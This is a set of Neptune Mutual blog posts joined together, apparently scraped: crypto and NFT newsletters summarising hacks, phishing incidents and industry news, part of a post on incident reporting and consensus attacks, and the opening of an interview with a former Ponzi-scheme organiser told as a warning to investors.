i.e. the duration of the resolution of the incident, but most importantly, the governance of the reporting process allows, under exceptional circumstances, for the reporting to be frozen to allow investigation of suspected malicious voting practises. If a Sybil attack was revealed to have taken place by the governance committee the attacker would risk losing all the NPM tokens staked in the attempted sybil reporting attack.</p><p>Another type of consensus attack is a 51% attack, or otherwise called, majority attack. The risk of 51% attacks is usually found in proof-of-work blockchains. These attacks intend to take control of the majority of the hash rate to cause service unavailability, double spending, service disruptions, amongst other things.</p><p>Although possible, a 51% attack of the Neptune Mutual project is extremely unlikely because it would be expensive to accumulate more than 50% of NPM tokens, and above all it is unlikely that sufficient tokens would be available for purchase, and finally the project team would be well placed to defend against this type of attack. Moreover, it is counterintuitive to exploit a project the attacker holds a majority stake of.</p><p>Timing attacks, in the form of pre-reporting and collusion and last block attacks are also risky and unfavourable to carry out. We’ll go further to explain how the risks of consensus and timing attacks are mitigated in a future blog.</p><h2 id="quick-summary">Quick Summary</h2><ul><li>Incidents are hack or exploit events which reporters consider have triggered the parameters of a cover pool policy.</li><li>Anyone with sufficient NPM tokens can report an incident, or vote on a reported incident.</li><li>60% of staked NPM tokens from the invalid reporters are rewarded to the winning group of valid reporters. 10% goes to the Final Reporter, and 30% of the invalid reporters’ tokens are burned.</li><li>If the Final Reporter was the First Reporter, then this person gets 5% of the protocol fees from the reported incident, paid out in stablecoin.</li></ul><p><em><em>Note: Neptune Mutual’s incident reporting and voting system requires the staking of NPM tokens and so shall be implemented following the public sale of NPM tokens. In addition to the reporting and voting utility of the NPM token, the Neptune Mutual team is working on developing other important utility functions of the NPM token, and for this reason it is expected that mainnet launch of the cover pool marketplace application will take place prior to the launch of the NPM token; more information will be released prior to mainnet about the voucher system that will be used for incident reporting and resolution.</em></em></p><h2 id="why-incident-reporting-matters">Why Incident Reporting Matters</h2><p>Through the power of the Neptunite community, incidents can be assessed in relation to a much wider variety of parameters than a system limited to onchain data. When providing digital asset protection, it is important that cover creators have the flexibility to fine tune the parameters of the cover pool policy to meet the specific security risks relevant to their own community.</p><p>The incident reporting and voting mechanism has been designed with the same principles in mind as the rest of the marketplace, that is to say: maximise security, minimise risk, maximise scalability and maximise user experience.</p><p>We hope that you’ll join the Neptunite community and participate in reporting and voting on incidents, and spreading awareness about <a href="https://neptunemutual.medium.com/be-aware-of-the-bear-1b718574acca" rel="noopener">the benefits of making financial protection mainstream</a>.</p><hr><h2 id="about-us">About Us</h2><p>Neptune Mutual project safeguards the Ethereum community from cyber threats. The protocol uses parametric cover as opposed to discretionary insurance. It has an easy and reliable on-chain claim process.

        html: "<h2 id=\"tldr\"><br>TL;DR </h2><ul><li>Playboy is planning to introduce the first MetaMansion in The Sandbox metaverse.</li><li>GameStop has released its public beta NFT marketplace.</li><li>Yuga Labs has opened Otherside for 'First Trips' in the Bored Ape Metaverse.</li><li>Flipkart and Nothing have partnered up for first NFT Drop on FireDrops. <br></li></ul><p>NFTs appear to be trading more often than ever, despite the fact that spot and derivative trading volumes have plummeted, wiping away almost $1.3 trillion from the cryptocurrency market. The total number of NFT transactions for the year exceeded 11 million in the first and second quarters, and is approaching 12 million in the third quarter.<br></p><h2 id=\"blockchain-hacks\">Blockchain Hacks </h2><p>Citizen Finance, a multi-chain NFT protocol, was attacked, and the $CIFI token lost more than half of its value. The stolen assets includes 244 BNB and 57,600 MATIC worth approximately $92,244. The user gained access to the Migration token on both BNBChain and Polygon Network, which was quickly transferred to another wallet before being exchanged for BNB and USDC. This attack's tokens have all been sold, and the funds can be easily traced back to the perpetrator's wallet.<br><br>In another incident, SpaceGodzilla was the victim of a typical price manipulation attack, losing approximately $25,379 USDT. The attacker obtained a large number of flash loans from various platforms before exchanging the borrowed USDT for the SpaceGodzilla token, and inflating its value. Following this, the attacker executed a function call on their smart contract, which resulted in the investment of both USDT and the SpaceGodzilla token in the unbalanced pool, where the attacker could exchange the project's token for more USDT. By redeeming and paying off the corresponding flash loans, the attacker was able to reap the profit.<br><br>THE NFT access list tool PREMINT was hacked, with hackers carrying out phishing attacks by inserting malicious JavaScript files into the website, duping users into signing the transaction of set approvals for all, thereby stealing the users' NFT assets. Granting token approval essentially gives the hacker permission to move your NFTs without you signing anything else. The attack lost approximately 280 ETH in total, totaling $381,818 at the time of the event, making it one of the largest NFT hacks of the year.<br><br>DeeKay Kwon, a well-known NFT artist and animator, is the latest victim of a Twitter hack. The hacker gained access to the artist's Twitter account and used it to spread a phishing link to his 180,000 followers. Unfortunately, the fake mint led many of DeeKay's followers astray and approved a malicious transaction that drained their wallets. According to reports, the hacker stole approximately $150,000 in digital assets from multiple victims.<br></p><h2 id=\"metaverse-and-nfts\">Metaverse, and NFTs </h2><p>The MetaMansion has been launched by iconic and raunchy lifestyle brand Playboy in collaboration with NFT-based Metaverse gaming platform The Sandbox. Playboy plans to expand its Web3 offerings with the launch of a MetaMansion, which will host gaming, social, and programmed events, as well as future NFT collectible releases from the company. The MetaMansion is also based on Playboy's Rabbitars NFT project, which comprises of 11,953 tokenized bunny avatars that were sold for approximately $800 in October 2021. Soon, holders of these NFTs will have access to exclusive experiences at the virtual mansion. However, neither the specifics nor the launch date have been specified.</p><p>GameStop has launched its own NFT marketplace with the goal of providing low fees and high speed speeds. The marketplace allows users to buy, sell, trade, and create NFTs, including added functionality to view NFT statistics, as well as educational material. Everything from NFT basics to connecting a wallet to the marketplace is covered in the educational content. On the app's main screen, the marketplace displays featured NFTs, NFT creators, and collections. The Explore interface also allows for a more in-depth examination of the market. The marketplace has already seen over 3,000 ETH in trading volume, worth about $3.6 million as of July 15.</p><p>The Otherside, a gamified metaverse project affiliated with the Bored Ape Yacht Club, launched their first trip as a tech demo with 4,500 participants. The 4,500 Voyagers first appeared as Voyager avatars in a blank virtual lobby before following a giant Bored Ape through a colorful portal into the Otherside Metaverse. When the Voyagers arrived in the Biogenic Swamp, they were directed to a centrally located stadium where they could practice avatar dynamics like dancing, running, jumping, and emojis. They were then able to explore a few other areas and interact with the environment, which featured giant creatures walking around and attacking Voyagers if they got too close.</p><p>Flipkart, the eCommerce juggernaut, and Nothing are teaming up for the very first NFT drop on FireDrops, dubbed Nothing Community Dots, which is set to go live on July 22nd. To clarify, the NFTs will be airdropped to specific individuals, all of those who pre-ordered the Nothing Phone (1) on Flipkart between July 12th and July 18th. Community investors must log in to their Nothing account, connect or create a crypto wallet, and navigate to the My NFT Page to receive the airdrop.</p><h2 id=\"onchain-insurance-industry-news\"><br>OnChain Insurance Industry News</h2><p>Bumper Finance has activated their FALKOR release, which will run in two phases of Alpha and Beta, both on a private network for testing. The alpha stage is expected to last 2-3 weeks among a small group of testers. Soon after, the Beta release is expected to allow a larger group of participants to actively engage in public testing.</p><p>iTrust Finance has partnered with Hodlnaut to integrate industry-first custody cover on their platform. With this quick and simple integration, anyone can purchase cover for their assets without leaving Hodlnaut at the best available price.</p><hr><h2 id=\"about-us\">About Us</h2><p>Neptune Mutual project safeguards the Ethereum community from cyber threats.

However, cryptocurrencies and highly valuable digital assets remain abundant, which explains why cybercriminals like hackers, scammers, and fraudsters continue to increase in number during this crypto winter despite the market’s bearish trajectory. There have been eight significant cyberattacks, hacks, and exploits in the second quarter of the year, totalling $445 million in stolen assets. Many Discord servers have been compromised in the first two weeks of June alone, with reports of 41 intrusions between June 1 and 10th. As a cautionary suggestion, we would like to remind everyone that any investment in digital or tokenised assets, no matter how modest, should be done with very careful consideration, and it’s always best to stick with projects that have had a number of audits and security checks by blockchain security agencies to minimise the chance of losing money.</p><h2 id="blockchain-hacks">Blockchain Hacks</h2><p>Harmony, the open and fast layer-1 blockchain, reportedly suffered from an exploit on the Horizon Bridge, losing approximately $100 million, including 11 ERC20 tokens, 13,100 ETH, 5,000 BNB, and 640,000 BUSD. The team has already begun collaborating with national authorities and forensic specialists to identify the perpetrator and recover the stolen funds. Fortunately, this theft had no effect on the trustless BTC bridge, so its funds and assets stored in decentralised vaults are currently safe. After which, they notified exchanges and shut down the Horizon bridge to prevent further malicious transactions; the Harmony team remains hard at work as the investigation continues.</p><p>Convex Finance was hit by a DNS attack that caused users to approve malicious contracts on some interactions on their website. The attack resulted in a loss of approximately 215 ETH. Currently, the team has resolved the issue, and a full investigation, followed by a post-mortem from official sources, is still pending. At the time of the event, 5 addresses appear to have approved malicious contracts, while funds on verified contracts remained unaffected. In addition, the team has created an alternate domain for Convex users to use.</p><p>The LV PLUS (Token LVP) project has been identified as a Rug Pull project, with losses of approximately $1.5 million. The main reason for the loss, which is defined as a Rug Pull, is that the LV PLUS contract deployer sent tokens to specific wallet addresses, which then sold the project’s tokens, causing the project’s market to crash. After receiving the tokens sent from the deployer wallet addresses, 5 major wallets dumped them, with the most funded wallet dumping $1,031,863 for a total of about $1.5 million. The funds are then transferred to a general account. The total profit in the account had reached $7 million at the time of the event, with all funds still in the scammer’s aggregated wallet.</p><p>XCarnival, the NFT liquidity solver, was exploited in a flurry of transactions, resulting in a gain of 3,087 ETH worth approximately $3.8 million for the hacker. The attack was made possible because the released NFTs were still used as collateral when the alleged attacker was able to transfer the NFT with a fake xToken and later borrow all the assets. The initial funding for the hack, 120 ETH, was withdrawn from Tornado Cash. The team has paused their smart contracts, and all deposit and borrowing actions are currently unavailable.</p><h2 id="metaverse-and-nfts">Metaverse, and NFTs</h2><p>Binance and Cristiano Ronaldo have announced a multi-year partnership that will result in the release of exclusive NFT collections. The global exchange has collaborated with football legend Cristiano Ronaldo to launch exclusive NFT collections on the Binance NFT marketplace. Binance users in certain countries can also use Binance Pay to purchase NFT collections. The collaboration will give global football fans access to limited edition NFT collections. The NFT collection’s first set will include iconic designs created in collaboration with Ronaldo, which is certain to entice football fans from all over the world, and Binance intends to elevate the experience.</p><p>Shopify customers can now connect their crypto wallets to stores on the platform to validate their own specific NFTs as part of a new series of connect-to-consumer initiatives launched this year. This activation will then grant them access to pre-sales for drops, in-person experiences, and exclusive content or merchandise. The initiative, dubbed tokengate, was previously tested in beta mode by invitation only to a select group of merchants with an NFT collection but is now open to all merchants worldwide. To get started, vendors can use the Shopify app to create a tokengate shop or add the feature directly in-store. Buyers would then need to connect their crypto wallet and prove they own the relevant NFTs, in order to shop gated merchandise or attend exclusive events. On the platform, the feature acts as a link between NFT communities and consumer brands.</p><p>eBay, the e-commerce behemoth, has announced the acquisition of KnownOrigin, the Manchester, UK-based NFT marketplace, for an undisclosed sum, which will allow the company to expand further into the worlds of blockchain technology and digital collectibles. The move demonstrates eBay’s ongoing interest in using cryptocurrency and blockchain technology to improve its operations. eBay was one of the first e-commerce sites, and it now aspires to be the preferred shopping destination for Generation Z and millennials.</p><p>MoonPay, a cryptocurrency payments company, has announced the launch of HyperMint, a new service that allows brands to mint up to 100 million NFTs at once. The new service enables creators and brands to associate images, music, video, or other metadata with tokens on their own platform. Fox Corporation, Creative Artists Agency (CAA), Universal Pictures, Death Row Records, the United Kingdom-based luxury store Selfridges, lifestyle and gaming platform FaZe Clan, and music producer Timbaland’s Beatclub are among the companies that have already signed on. MoonPay CEO Ivan Soto-Wright revealed that one of its potential use cases is proof of attendance tokens, which are used to track how many people attended an event. MoonPay also stated that these digital assets would be utility tokens, as opposed to security tokens.</p><p>The National Hockey League has announced a collaboration with NFT Marketplace Sweet. This will be the league’s first foray into digital collectibles. The partnership, which includes the NHL’s players and Alumni Association, will go live in October to coincide with the start of the 2022–2033 NHL season. The NFT marketplace is expected to provide NHL fans with a variety of experiences, including digital collectibles featuring historical moments, past and present season game highlights, and NHL stars’ top plays. Gamified collection experiences, specialty packs, and 3D interactive trophy rooms where users can display their collections will also be available on the marketplace.</p><h2 id="onchain-insurance-industry-news">OnChain Insurance Industry News</h2><p>The Nexus Mutual token, NXM, was trading around the 39.5 USD mark on Friday 24th June whilst the wrapped version of its token, WNXM, was trading around 10.75 USD. So why such a difference in value?</p><p>NXM tokens are purchased to buy membership of the blockchain-based mutual from which smart contract cover is available; this cover can be purchased in NXM tokens. The sale of NXM tokens is constrained by capital requirement conditions associated with the policies that have been underwritten. Members can wrap the NXM token, and in so doing create the WNXM token which is transferable.</p><p>With the integration of EaseDeFi, formerly ArmorFi, into Bright Union’s Uninsurance ecosystem, users of the latter platform can now make better-informed risk management decisions with the most comprehensive offering of insurance products against hacks and smart contract failures. With this integration, their users can now enjoy premium-free coverage with a pay-only service if a hack occurs.</p><hr><h2 id="about-us">About Us</h2><p>Neptune Mutual project safeguards the Ethereum community from cyber threats.

Wouldn’t that be surreal? Using NFTs, artists can now create content, govern how it’s utilised, and most importantly, connect with their fans on a deeper level than ever before. We can use Metaverse as a virtual school, a gaming platform, a virtual shop, a training tool, a marketing channel, or even a doorway to new virtual worlds. No doubt that the metaverse can usher in a new wave of digital disruption even while it is still in the process of being established. As of May 2022, more than $120 billion has been invested in the development of metaverse technology and infrastructure, which is more than double the $57 billion invested for the entire year of 2021.</p><h2 id="blockchain-hacks">Blockchain Hacks</h2><p>A flash loan attack cost FSwap, an innovative Automated Market Maker and an NFT Decentralized exchange, approximately $500,000 in losses. The attack was a vulnerability incident in a non-attacked project, as well as a malicious loan attack, in which hackers borrowed money from BISWAP to FSWAP for transaction attacks. Multiple USDT liquidity pools on FSWAP were attacked by hackers, who were successful in infiltrating their protocol on multiple occasions, until BlockSec, the Blockchain Security company, was able to recover a significant portion of the funds.</p><p>Due to a flash-loan assault that manipulated the pricing oracle, Inverse Finance, a suite of permission-less decentralized finance tools overseen by Inverse DAO, sustained a loss of about $1.26 million. Exploiters added a flash loan attack and first withdrew 1 ETH using Tornado Cash in order to mislead the system. According to on-chain data, the exploiter borrowed 27,000 WBTC, worth about $579 million, in a flash from the lending protocol Aave in order to launch the attack. Prior to being used to withdraw DOLA, a stablecoin, from Inverse Finance pools, the money was channeled through the swap provider Curve in exchange for other stablecoins, netting them 53 BTC worth around $1.1 million and 10,000 USDT. The attacker then transferred 1,000 ETH to Tornado Cash and left $75,000 in the wallet’s balance.</p><p>The Anata NFT Discord service was infiltrated, and hackers posted bogus mint and NFT airdrop messages. The phishing scam enabled the exploiters to acquire a total of 6 NFTS, including 4 Anata NFTs and 2 Flyfish Club NFTs, valued at around $28,300 USD at the time of the occurrence.</p><h2 id="metaverse-and-nfts">Metaverse, and NFTs</h2><p>In collaboration with the well-known NFT communities of Bored Ape Yacht Club and CLONE-X, watchmaker TAG Heuer has created a smartwatch that shows NFTs and connects to crypto wallets such as MetaMask and Ledger Live. According to the company, a linked smartphone will be used to transfer NFTs to the TAG Heuer Connected Calibre E4 watch. Owners will be able to display both JPEG and GIF NFTs, which will appear in a hexagon pattern on the watch’s face, similar to how Twitter displays authenticated NFT profile pictures. Static and animated NFT artwork can both be supported by the device, and numerous NFTs can be sent to the watch at the same time. The NFT artwork can be scaled and inserted in one of three available watch designs. The wearer’s NFTs can be verified by connecting the smartwatch to the blockchain. All Tag Heuer Calibre E4 owners will be able to get this new NFT technology for free from Apple’s App Store and Google Play.</p><p>Wimbledon, the world’s oldest and most prestigious tennis tournament, is ready for new chapters as it celebrates its 100th anniversary by launching “The Centenary Collection,” an NFT collection created in collaboration with the Glorious NFT studio. The Centenary NFT Collection honours the All-England Lawn Tennis and Croquet Club, also known as the Centre Court, on its 100th anniversary. There are ten NFTs in total, each representing a decade of tennis on the famous centre court. Each of these NFTs is limited to 100 editions. This equates to a total of 1000 NFTs at £500 each. This NFT collection promises to deliver an excellent and historical collection of NFT digital art, commemorating a century of world-class tennis at Wimbledon.</p><p>Arizona State University, one of the biggest public universities in the United States, plans to join the Metaverse and Web3 ecosystems. It also intends to issue NFTs for the authentication of event tickets and certificates. According to a series of trademark filings with the United States Patent and Trademark Office (USPTO), the university’s future offerings could include NFTs and virtual reality lectures, including their hopes to create digital collectibles for in-house events and other activities on its campus. NFTs depicting the university’s athletic highlights are also expected to be released. Another goal for the institute is to hold virtual classes, meetings, and other projects in the Metaverse.</p><p>NFT.NYC is gearing up for the fourth year of celebration of NFTs across 16 industries. This year’s NFT conference, which will take place from June 20 to 23, will have 1,500 speakers from across the world, as well as several panels, presentations, fireside chats, and pop-up events. Over 15,000 people are expected to attend this year’s event, up from the 5,600 who attended last year. The NFT.NYC team has picked 221 rising international artists from an applicant pool of 5,000 to show their work on a Times Square billboard and throughout the Marriott Hotel, with a clear emphasis on prioritizing the wants of the community over brands or businesses. Upon the completion of the event, these artists will be able to sell their work for a price of their choosing and keep 75% of the proceeds.</p><p>As part of its overall partnership with Paramount Global, RECUR has released some of Nickelodeon’s most iconic 90s programming into the metaverse. The collaboration began with an NFT drop of characters and scenes from the two popular 90s shows. Nickelodeon fans will be able to purchase some of the most iconic moments and characters from the Rugrats and Hey Arnold! series as NFTs. By participating in the NFT drop, fans of the show will be able to own a piece of Nick’s history. The initial drop consisted of 10,000 Nickelodeon NFT packs that will be available through Nickelodeon. xyz, an NFT marketplace branded by Paramount RECUR powers this website. The NFTs were auctioned off at a price of $50 each. Each pack included a one-of-a-kind 1-for-1 profile picture (PFP) based on one of twelve characters from Rugrats and Hey Arnold! Each series will contribute six characters who represent memorable moments for Nickelodeon fans worldwide.</p><h2 id="onchain-insurance-industry-news">OnChain Insurance Industry News</h2><p>Sherlock Protocol has partnered with LiquiFi to provide $10 million in smart contract coverage, effective immediately, including an additional $1 million paid for by the team in Immunefi’s bug bounty, with hopes for continued collaboration to review updates and maintain their small-contract coverage.</p><hr><h2 id="about-us">About Us</h2><p>Neptune Mutual project safeguards the Ethereum community from cyber threats.

Decentralized protocols are creating new cultures, and people on the internet are looking for ways to gain control and have their voices heard. At the present time, the world contains valuables in both the physical and digital realms, forcing many to walk a fine line between the two. It’s just a matter of time before the world sets a new standard for what it considers truly important. Digital centre for creators and a place to roam within its metaverse space for community members to experience the vision that Metaverse is striving for Industry activity has continued to be solid, with May NFT sales volumes of $3.7 billion, according to several reports.</p><h2 id="blockchain-hacks">Blockchain Hacks</h2><p>Wintermute, a global algorithmic market maker in digital assets, lost 20 million OP tokens, which were worth approximately $27.6 million at the time of the incident. Optimism entrusted Wintermute with 20 million OP tokens to provide liquidity services for OP in the secondary market. Wintermute provided Optimism with a multi-signature address to which Optimism transferred 20 million OPs after Optimism tested sending two transactions and Wintermute confirmed they were correct. Wintermute later discovered that they had no control over the coins after Optimism transferred them because the multi-signature addresses they provided were only deployed on the Ethereum mainnet, not the Optimism network. Wintermute immediately began remediation efforts to reclaim these tokens. However, before Wintermute, attackers discovered this vulnerability and deployed multi-signature to this address on the Optimism network, successfully controlling the 20 million tokens.</p><p>Gym Network, a DeFi Aggregator Investment System, experienced a vulnerability in their recently deployed Claim &amp; Pool function for Single Pool, resulting in a significant drop in token price. The hack occurred due to a lack of caller verification, which was used to increase the balance without making any payment, resulting in the loss of assets worth $2.1 million.</p><p>Cosmos-based DeFi protocol, Osmosis Network, suffered a $5 million loss due to the Liquidity Pool vulnerability. A critical bug on Osmosis was discovered by a Reddit user, which could drain all liquidity pools. Anyone on the platform would be able to add liquidity to any pool and receive an additional 50% when removing it. As users began to take advantage of this process while it was vulnerable to the snowball effect, significant damage was already done. Validators began reporting issues on Discord following the v9 Nitrogen upgrade, and an emergency halt was declared to save the remaining liquidity on the DEX.</p><p>A vulnerability in the ApolloX signature system led to an attack against the ApolloX project. The attacker used the signature system flaw to generate 255 signatures, with a total of 53,946,802 $APX extracted from the contract, worth about $1.6 million. The problem has been fixed, and withdrawals on DEX can now be made again. The team has also decided to make up for the losses through the open repurchase of APX and APX received through trading fees on the exchange.</p><h2 id="metaverse-and-nfts">Metaverse, and NFTs</h2><p>The English Premier League (EPL), one of the iconic European Football Competition, has officially entered the world of NFTs. The company registered two crypto trademarks with the US Patent and Trademark Office, revealing its lofty ambitions for the rapidly expanding NFT sports niche. To be more specific, EPL submitted two applications. The first featured the iconic lion logo. In the meantime, the second was for a trophy with a crown and two golden lions on each side. Furthermore, the filings mention NFT-related licenses, implying that we may soon see NFTs, exchange services, and digital merch from the bestowed competition.</p><p>Budweiser has partnered with Zed Run, a metaverse horse racing game, to enter the GameFi market. The legendary beer brand continues to make movements in the Web3 community, appealing to a completely new demographic. After releasing 2,500 Budweiser Pass NFTs for $225 on 9 June 2022, Budweiser and Zed Run offered a variety of unique utilities, airdrops, and chances to win real-world giveaways. Racehorse skins from three rarity tiers will be given to Budweiser Pass subscribers in July 2022. All three skins will be given out at random: gold, a Budweiser bottle, and Clydesdale. Starting in July, there will be a series of tournaments and challenges with rewards totalling up to $95,000, which will culminate with the final event in December. Finally, all ticket holders will receive a ZED RUN Decentraland t-shirt designed exclusively by Budweiser.</p><p>Salesforce has announced the launch of NFT Cloud, a pilot NFT platform in which users can mint and trade digital assets. This newly launched product has been viewed by the American software company as a way to connect with its customers and make NFT selling more accessible. The company’s website does not specify which blockchains and wallets NFT Cloud will support in the future, nor which wallets or blockchains the platform will support, only that the platform will connect data, communities, and wallets and allow users to deploy from secure, sustainable technology.</p><p>Qatar Airways has introduced QVerse, its first metaverse experience. This virtual reality platform enables interested parties to virtually visit and navigate the Hamad International Airport’s Premium Check-in section. QVerse is simply the company’s initial venture into the Metaverse, as it intends to expand its virtual environment efforts and envisions the metaverse as an integral component of the future of human relationships. According to the company, its introduction into the metaverse is a reflection of its passengers’ need for immersive information that can aid their decision-making before to purchasing a ticket, as well as their want to explore the aircraft they will be flying on. Additionally, the business emphasized that it intends to add more features, locations, and interactions to its metaverse platform and that it intends to make the experience social and accessible via the Oculus Quest VR platform.</p><p>Mastercard, the international payment processing giant, has expanded its payment network for NFT markets and Web3. Over the past year, the financial services provider has been working on expanding their payment networks to NFTs, and has partnered with a number of leading NFT marketplaces, including Immutable X, Candy Digital, The Sandbox (SAND), Mintable, Spring, Nifty Gateway, and Web3 infrastructure provider MoonPay, to allow 2.9 billion cardholders to directly make NFT purchases without first purchasing crypto. With the latest Mastercard collaboration, billions of cardholders can now avoid the process of purchasing and transferring cryptocurrency to NFT marketplaces.</p><h2 id="onchain-insurance-industry-news">OnChain Insurance Industry News</h2><p>The Frax Finance de-pegging protection pool has been launched by Tidal Finance and is now accepting deposits.

This is the next step in the evolution of the Internet, bridging both the physical and digital worlds. NFTs have enabled marketers to target specific customers and reward those who wish to participate in a different way for each tier of customers served. Products that can be used in the Metaverse are in high demand as more people experiment with virtual reality.</p><h2 id="blockchain-hacks">Blockchain Hacks</h2><p>More than $260,000 in digital assets were lost in a coordinated phishing attack against Yuga Labs, the creator of two of the most popular ape-themed NFT services, Bored Ape Yacht Club and OtherSide. According to a Twitter user’s inquiry, Boris Vagner, Yuga Labs’ community and social manager, was the victim of a hacking attack on his Discord account. Once the scammers gained access to the employee’s Discord account, they shared phishing links from Vagner’s Discord into the official BAYC, Mutant Ape Yacht Club, and Otherside groups. Phishing messages promising limited-quantity giveaways for existing NFT holders fooled many Discord users who were unaware of the continuing fraud.</p><p>Another phishing scam leads to the theft of two MAYC and eight Cool Cats NFTs accidentally caused when the NFTs’ owner clicked a bogus link to the recently promoted Goblintown NFT collection. A Twitter user was the victim of this particular scam, and ten of their NFTs were stolen. This occurred after he followed a bogus link to the Goblintown NFT collection. The scam could simply be a hacker’s creation that was so similar to the original collection’s website that the victim couldn’t tell the difference.</p><p>The Mirror Protocol, a decentralized finance platform on the Terra network, was exploited as a result of an Oracle price manipulation bug that drained millions of dollars in total value locked. Hackers got away with more than $2 million from it with only $1,000 worth of Luna, due to an issue affecting how its price-setting software reacted to the recent cryptocurrency crash, and developers rushed to the decision to create a newer version of it. The attacker appears to be taking advantage of price oracles by mismatching the old LUNC token with the new LUNA token. Following the incident, the platform disabled the use of BTC, ETH, GLXY, and DOT as collateral, preventing the attacker from draining the remaining pools.</p><h2 id="metaverse-and-nfts">Metaverse, and NFTs</h2><p>Prada, the world-renowned luxury brand, has expanded its footprint on Web3 with the launch of a new NFT Collection. The 100 Ethereum-based NFTs are a supplement to the actual Prada Timecapsule, a collection of elegant black or white shirts that debuted in 2019. The physical project, which includes 100 gender-neutral shirts developed in partnership with Cassius Hirst, provides a direct link to the soon-to-be airdropped NFTs. This NFT release intends to highlight the evolution of the Timecapsule initiative, in which the world-renowned brand has featured a special edition item from the series on its website on the first Thursday of every month since 2019. During this second phase, each physical shirt owner will also receive an NFT, which will serve as a digital record documenting the drop’s serial number and including a unique identifier for each shirt.</p><p>While blockchain technology is still in its formative years, South Korea has taken a proactive approach to promoting it. SoKor’s government has invested $117.1 million directly in various metaverse projects, betting on the technology’s potential and making it one of their top priorities in the years to come. Investments in emerging Metaverse technologies are part of the country’s new Digital New Deal initiatives, making it one of the first national governments to do so. South Korea’s Ministry of Science and Information and Communication Technology, led by Lim Hyesook, will spearhead the program, which will first use the national fund to build a metropolitan-level metaverse platform that will allow citizens to access various government programs and services virtually.<br><br>With the FIFA World Cup Qatar 2022 kicking off in November, Qatar has become the first Middle Eastern country to hold a FIFA metaverse competition in association with the esports platform Ooredoo Nation-Gamers’ Land. The Aspire Ladies Sports Hall in Doha hosted a competition in which 16 players competed for a variety of prizes, with the winner taking home $25,000, the first runner-up receiving $15,000, and the second runner-up and fourth-best players each receiving $5000. Additionally, Ooredoo Nation — Gamers’ Land offered viewers free NFTs, which could be redeemed for other merchandise or held for long-term investment, extending the holders’ chances to meet players and other influencers. <br><br>DC Comics launches a beta version of an NFT marketplace on the Palm Network. AMC’s The Batman posters, DC’s Bat Cowl collection, FanDome 2021, and Gotham City Knightwatch District Sigil NFTs comprise the first four collections, with their initial mint price set at $300. In the DC Comics ecosystem, the beta marketplace is merely the beginning of a much larger project. Those who purchase the DC Bat Cowl Collection will also have an impact on the direction the Batman comic takes in the future. The 20,000 NFT holders will also vote on the DC Comics magazine’s story, characters, and art.</p><p>Kanye West has filed 17 trademark applications for his Yeezus brand connected to metaverse and NFT, as the rapper prepares to release his own NFTs alongside a wide range of physical products. The applications, which are available through the US Patent and Trademark Office, mention non-fungible items, assets, currencies, and tokens based on blockchain technology. It also comprises online retail store services that offer downloadable movies, videos, television, music, entertainment, and digital art.</p><h2 id="onchain-insurance-industry-news">OnChain Insurance Industry News</h2><p>The InsurAce Protocol has teamed up with Single Finance, the first DeFi protocol to provide leveraged yield farmers with USD-based capital-protection measures. This collaboration intends to provide a safer trading environment for all, with users being able to purchase Smart Contract Cover on their dAPP to protect themselves against hackers, vulnerabilities, and exploits for Single Finance.<br><br>Bridge Mutual teams up with Drops DAO, a platform that provides loans to NFT and DeFi assets, offering much-needed utility. Users of the Drops DAO lending platform can now acquire insurance coverage for all collateralized NFTs within their lending pools, including any future NFT collections, with the coverage extending to any protocol hack or exploit on the frontend and backend.</p><hr><h2 id="about-us">About Us</h2><p>Neptune Mutual project safeguards the Ethereum community from cyber threats.

        html: '<p>When bumping into the topic of hackers and scammers, we tend to picture the stereotypical masked figure in a black hoodie hiding in the shadows, facing a red or green screen with thousands of lines of code, and hands typing faster than light. Surely, you’ve seen those characters in your typical movie and TV hacking scenes.</p><p>But, the average hacker or scammer usually isn’t like that. They’re everyday people that could pass off as your neighbours or the friendly person who smiled at you the other day.</p><p>Recently, we met with an ex-scammer whom we’ll call Sam (obviously not his real name). At first glance, he looks like a young, decent guy who you wouldn’t think of being the ringleader of a citywide Ethereum-based Ponzi scheme that siphoned thousands of dollars from unsuspecting people.</p><p>In an effort to make amends for his involvement in a scam that would deliberately harm investors, he has now agreed to share his experience in an effort to help investors be aware of these types of exploits and be better prepared to avoid them.</p><h2 id="ex-scammer-confesses-ins-and-outs-of-crypto-schemes">Ex-Scammer Confesses: Ins and Outs of Crypto Schemes</h2><h3 id="q-please-tell-us-about-yourself-and-the-scam-you-pulled">Q: Please tell us about yourself and the scam you pulled.</h3><p>Hi, thanks for having me here. I’m Sam. I led an almost nationwide scam back in 2019 together with a team of 6. We introduced an already popular crypto Ponzi scheme called ******, to the Ethereum network. We marketed it as a fast-growing and high-profit investment with two ways of generating returns: Ether capital gains (something you could already do without joining the scheme) and getting other people to buy into the scheme. Essentially, it was a pyramid scheme disguised as an MLM scheme (multi-level-marketing).</p><p>We got a lot of people to sign up from five different cities. We also managed to get some users from other countries. Our team used all types of social media tools to pull people into the scheme: social media accounts including a Discord channel to close transactions, chatbots, and people dedicated to closing a deal to onboard individuals. We even tried to break into influencer marketing to grow the scheme more rapidly. Fortunately, the influencers we contacted either ignored us or were smart enough not to bite our bait.</p><p>Of course, our success in growing the scheme got the project noticed not only by those we were trying to onboard but also by those that could see it for what it was. Towards the end, the scheme got so big that it was flagged up by a government financial regulator who issued a warning about the scam and everyone involved. As a team, we were mostly amateurs, including myself. Eventually, one by one, members of the team started to get worried about being caught and started to leave, before the situation and consequences got even worse. I was one of the last ones to go. And now, I wish I was one of the first.</p><h3 id="q-tell-us-more-about-your-involvement-and-how-you-did-it">Q: Tell us more about your involvement and how you did it?</h3><p>I was in charge of communication and our social media channels. At first, our initial targets were people who understood the Ponzi nature of the scheme and that they were getting in early and therefore had a good chance of exiting and making lots of money. Thereafter the network effect took over and all these people were incentivised to onboard others. Exponential growth appears to progress relatively slowly to start with but with the number of people who grew that were strongly motivated to recruit others, we experienced an unbelievable acceleration in the growth of the scheme. And of course, we did everything possible to maximise this growth, opening up more and more social media channels to widen the base of the Ponzi scheme.</p><p>We did our best to answer the questions in the social media channels, but when I say did our best, I mean we did our best to obscure what was going on and encourage the community to onboard new users. Showing users that they could make a lot of money fast by onboarding new users was usually all we needed to do in order to get people to cash in, and then we set them up on a call to guide them through the process. Once that was done, the money went into the accounts and progressed up the Ponzi chain to those that joined first. We didn’t completely leave new users on their own. We had post-sales service and got them to join in a mini-community. And that was about it. Providing a big monetary incentive with simple instructions and actions that individuals felt they could achieve. And they were hooked.</p><figure class="kg-card kg-image-card"><img src="https://blog.neptunemutual.com/content/images/2022/07/how-to-avoid-crypto-scams-2.png" class="kg-image" alt="" loading="lazy" width="1400" height="700" 